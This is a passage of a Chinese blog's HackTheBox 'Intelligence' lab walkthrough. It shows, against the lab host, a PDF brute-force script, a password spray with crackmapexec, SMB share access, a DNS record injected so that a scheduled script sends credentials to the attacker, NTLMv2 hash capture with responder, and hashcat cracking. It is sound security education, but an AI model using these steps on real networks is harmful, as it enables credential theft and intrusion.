@@ -1,0 +1,1102 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/apple-touch-icon.png">
+  <link rel="icon" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="何语灵">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="每周练手">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Intelligence">
+<meta property="og:url" content="https://m0ck1ng-b1rd.github.io/2021/12/07/HTB/Intelligence/index.html">
+<meta property="og:site_name" content="M0cK1nG-b1Rd&#39;s site">
+<meta property="og:description" content="每周练手">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/images_modified/78c5d8511bae13864c72ba8df1329e8d.png">
+<meta property="article:published_time" content="2021-12-07T05:01:01.000Z">
+<meta property="article:modified_time" content="2022-04-14T10:57:10.486Z">
+<meta property="article:author" content="何语灵">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/images_modified/78c5d8511bae13864c72ba8df1329e8d.png">
+  
+  
+  
+  <title>HackTheBox - Intelligence - M0cK1nG-b1Rd&#39;s site</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"m0ck1ng-b1rd.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"87rdYWc7BpvmNHtufVgH6hwF-gzGzoHsz","app_key":"FOGIb6hlzKdTWSp4wBpACnWG","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>M0cK1nG-b1Rd&#39;s site</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/761607.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox - Intelligence"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-12-07 13:01" pubdate>
+          2021年12月7日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          59 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="HackTheBox"
+        id="heading-d9fb08be3ed131369df5d4aa808dac70" role="tab" data-toggle="collapse" href="#collapse-d9fb08be3ed131369df5d4aa808dac70"
+        aria-expanded="true"
+      >
+        HackTheBox
+        <span class="list-group-count">(16)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-d9fb08be3ed131369df5d4aa808dac70"
+           role="tabpanel" aria-labelledby="heading-d9fb08be3ed131369df5d4aa808dac70">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/07/HTB/BountyHunter/" title="HackTheBox - BountyHunter"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - BountyHunter</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Cap/" title="HackTheBox - Cap"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Cap</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Driver/" title="HackTheBox - Driver"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Driver</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Horizontall/" title="HackTheBox - Horizontall"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Horizontall</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Intelligence/" title="HackTheBox - Intelligence"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">HackTheBox - Intelligence</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Monitors/" title="HackTheBox - Monitors"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Monitors</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Previse/" title="HackTheBox - Previse"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Previse</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Schooled/" title="HackTheBox - Schooled"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Schooled</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/13/HTB/Seal/" title="HackTheBox - Seal"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Seal</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/04/13/HTB/Shibboleth/" title="HackTheBox - Shibboleth"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Shibboleth</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Sink/" title="HackTheBox - Sink"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Sink</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Spider/" title="HackTheBox - Spider"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Spider</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/StartingPoint-Archetype/" title="HackTheBox - StartingPoint-Archetype"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Archetype</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/StartingPoint-Pathfinder/" title="HackTheBox - StartingPoint-Pathfinder"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Pathfinder</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/05/19/HTB/Unicode/" title="HackTheBox - StartingPoint-Pathfinder"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Pathfinder</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/dynstr/" title="HackTheBox - dynstr"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - dynstr</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox - Intelligence</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2022年4月14日 晚上
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="0x01-端口探测"><a href="#0x01-端口探测" class="headerlink" title="0x01 端口探测"></a>0x01 端口探测</h1><p>使用nmap对靶机进行探测：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV -sC <span class="hljs-number">10.10.10.248</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20210930211850122.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210930211850122"></p>
+<p>比较标准的DC端口，还多了个WEB的80。</p>
+<h1 id="0x02-user-txt"><a href="#0x02-user-txt" class="headerlink" title="0x02 user.txt"></a>0x02 user.txt</h1><p>进WEB看看，发现在主页目录可以下载文档。主页能下载的文档文件名为<code>2020-01-01-upload.pdf</code></p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008103916590.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211008103916590"></p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008104103851.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211008104103851"></p>
+<p>遂写了脚本进行爆破，将所有的文档下载下来：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">for</span> month <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">13</span>):<br>    <span class="hljs-keyword">for</span> day <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>):<br>        file_name = <span class="hljs-string">&quot;2020-%02d-%02d-upload.pdf&quot;</span> % (month, day)<br>        resp = requests.get(<span class="hljs-string">&quot;http://10.10.10.248/documents/&quot;</span> + file_name)<br>        <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(file_name)<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_name, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(resp.content)<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008104214464.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211008104214464"></p>
+<p>其中，大多数文档都是无意义的填充文字，为了避免一个个看过去，写了个脚本提取文字：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 安装  pip install pdfplumber</span><br><span class="hljs-keyword">import</span> pdfplumber<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-comment"># 利用pdfplumber提取文字</span><br>file = sys.argv[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">with</span> pdfplumber.<span class="hljs-built_in">open</span>(file) <span class="hljs-keyword">as</span> pdf:<br>    first_page = pdf.pages[<span class="hljs-number">0</span>]<br>    <span class="hljs-built_in">print</span>(file)<br>    <span class="hljs-built_in">print</span>(first_page.extract_text())<br>    <span class="hljs-built_in">print</span>()     <br></code></pre></td></tr></table></figure>
+
+<p>将脚本保存为<code>extract.py</code>，该脚本使用方式为<code>python3 extract.py 2020-01-01-upload.pdf </code>，为了批量处理需要配合shell命令进行使用。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">ls</span> | grep pdf) ; <span class="hljs-keyword">do</span> python3 extract.py  <span class="hljs-variable">$i</span> ; <span class="hljs-keyword">done</span> &gt; text_extract.txt<br></code></pre></td></tr></table></figure>
+
+<p>查看提取出的文字，对一些字段进行搜索，可以看到在搜索pass时能够看到初始密码：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211001110440842.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211001110440842"></p>
+<p>有了密码，我们还需要用户名才能进行登录，使用工具<code>exiftool</code>查看用户名：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008104808719.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211008104808719"></p>
+<p><code>2020-06-04-upload.pdf</code>的用户名不能登陆，所以我们需要提取所有的用户名：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ls</span>) ; <span class="hljs-keyword">do</span> exiftool <span class="hljs-variable">$i</span>| grep Creator |awk <span class="hljs-operator">-F</span>: <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>; done<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211008105032513.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211008105032513"></p>
+<p>将所有的用户名保存为username.txt，使用crackmapexec进行密码喷洒攻击：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">crackmapexec</span> smb <span class="hljs-number">10.10.10.248</span> -u username.txt -p <span class="hljs-string">&quot;NewIntelligenceCorpUser9876&quot;</span> <br></code></pre></td></tr></table></figure>
+
+<p>最终爆破得到如下信息：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211001124730527.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211001124730527"></p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">domain</span> <span class="hljs-operator">=</span> intelligence.htb<br><span class="hljs-attribute">username</span> <span class="hljs-operator">=</span> Tiffany.Molina<br><span class="hljs-attribute">password</span> <span class="hljs-operator">=</span> NewIntelligenceCorpUser9876<br></code></pre></td></tr></table></figure>
+
+
+
+<p>连上smb翻一下文件，能够找到一个downdetector.ps1，我们将这个文件下载下来：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">smbclient -L <span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.248</span> -U Tiffany.Molina<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">╭─root@kali ~/下载/pdf <br>╰─<span class="hljs-comment"># smbclient -L //10.10.10.248 -U Tiffany.Molina</span><br>Enter WORKGROUP\Tiffany.Molina<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">	Sharename       Type      Comment</span><br><span class="hljs-string">	---------       ----      -------</span><br><span class="hljs-string">	ADMIN$          Disk      Remote Admin</span><br><span class="hljs-string">	C$              Disk      Default share</span><br><span class="hljs-string">	IPC$            IPC       Remote IPC</span><br><span class="hljs-string">	IT              Disk      </span><br><span class="hljs-string">	NETLOGON        Disk      Logon server share </span><br><span class="hljs-string">	SYSVOL          Disk      Logon server share </span><br><span class="hljs-string">	Users           Disk      </span><br><span class="hljs-string">SMB1 disabled -- no workgroup available</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">╭─root@kali ~/下载/pdf </span><br><span class="hljs-string">╰─# smbclient  //10.10.10.248/IT -U Tiffany.Molina</span><br><span class="hljs-string">Enter WORKGROUP\Tiffany.Molina&#x27;</span>s password: <br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">dir</span><br>  .                                   D        0  Mon Apr 19 08:50:55 2021<br>  ..                                  D        0  Mon Apr 19 08:50:55 2021<br>  downdetector.ps1                    A     1046  Mon Apr 19 08:50:55 2021<br><br>		3770367 blocks of size 4096. 1460376 blocks available<br>smb: \&gt; get downdetector.ps1<br>getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)<br><br><br><br>╭─root@kali ~/下载/pdf <br>╰─<span class="hljs-comment"># smbclient  //10.10.10.248/Users -U Tiffany.Molina</span><br>Enter WORKGROUP\Tiffany.Molina<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; get Tiffany.Molina\Desktop\user.txt</span><br><span class="hljs-string">getting file \Tiffany.Molina\Desktop\user.txt of size 34 as Tiffany.Molina\Desktop\user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>然后顺手拿个user的flag：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211001130336719.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211001130336719"></p>
+<h1 id="0x03-root-txt"><a href="#0x03-root-txt" class="headerlink" title="0x03 root.txt"></a>0x03 root.txt</h1><p>查看downdetector.ps1，内容如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Check web server status. Scheduled to run every 5min</span><br><span class="hljs-built_in">Import-Module</span> ActiveDirectory <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$record</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-string">&quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot;</span> | <span class="hljs-built_in">Where-Object</span> Name <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;web*&quot;</span>)  &#123;<br>	<span class="hljs-keyword">try</span> &#123;<br>		<span class="hljs-variable">$request</span> = <span class="hljs-built_in">Invoke-WebRequest</span> <span class="hljs-literal">-Uri</span> <span class="hljs-string">&quot;http://<span class="hljs-variable">$</span>(<span class="hljs-variable">$record</span>.Name)&quot;</span> <span class="hljs-literal">-UseDefaultCredentials</span><br>		<span class="hljs-keyword">if</span>(.StatusCode <span class="hljs-operator">-ne</span> <span class="hljs-number">200</span>) &#123;<br>			<span class="hljs-built_in">Send-MailMessage</span> <span class="hljs-literal">-From</span> <span class="hljs-string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="hljs-literal">-To</span> <span class="hljs-string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="hljs-literal">-Subject</span> <span class="hljs-string">&quot;Host: <span class="hljs-variable">$</span>(<span class="hljs-variable">$record</span>.Name) is down&quot;</span><br>		&#125;<br>	&#125; <span class="hljs-keyword">catch</span> &#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>结合文件名，我们可以推测该脚本的作用。每五分钟，该脚本会查找以“web”开头的域内二级站点，并使用<code>Ted</code>的凭据为每条找到的记录发送HTTP请求。(使用<code>-UseDefaultCredentials</code>选项)如果服务器没有返回200 OK状态码，则会向<code>Ted</code>发送一封邮件。</p>
+<p>发送邮件不是我们关心的内容，重要的是HTTP请求带上了用户的凭据信息，我们可以插入一条相对应的DNS记录，指向自己的机子，这样就能拿到Ted.Graves的凭据信息了：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> dnstool.py -u <span class="hljs-string">&#x27;intelligence.htb\Tiffany.Molina&#x27;</span> -p <span class="hljs-string">&#x27;NewIntelligenceCorpUser9876&#x27;</span> -a add -r <span class="hljs-string">&#x27;websucks.intelligence.htb&#x27;</span> -d <span class="hljs-number">10.10.14.27</span> <span class="hljs-number">10.10.10.248</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211005161234902.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211005161234902"></p>
+<p>之后开启responder，监听vpn的网卡，等最多5分钟就能拿到Ted.Graves的NTLMv2 Hash：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">responder -<span class="hljs-selector-tag">I</span> tun0<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211005161628128.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211005161628128"></p>
+<p>使用netcat进行爆破，最后能够拿到Ted.Graves的密码为Mr.Teddy：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -m <span class="hljs-number">5600</span> -a <span class="hljs-number">0</span> hash <span class="hljs-string">&quot;E:\path\pass_en.txt&quot;</span> # 这里的字典就是rockyou.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211005162018451.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211005162018451"></p>
+<p>但是登上去后，并没有任何更多的信息，所以不是smb这条路，我们需要换一条思路：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211005162902520.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211005162902520"></p>
+<p>回去翻翻pdf，在最后一条能够发现一些提示信息：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Intelligence.assets/image-20211005165904813.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211005165904813"></p>
+<p>也就是说，此时此刻服务账户是未被锁定的。</p>
+<p>看看ldap信息，使用ldapdomaindump导出所有ldap信息：</p>
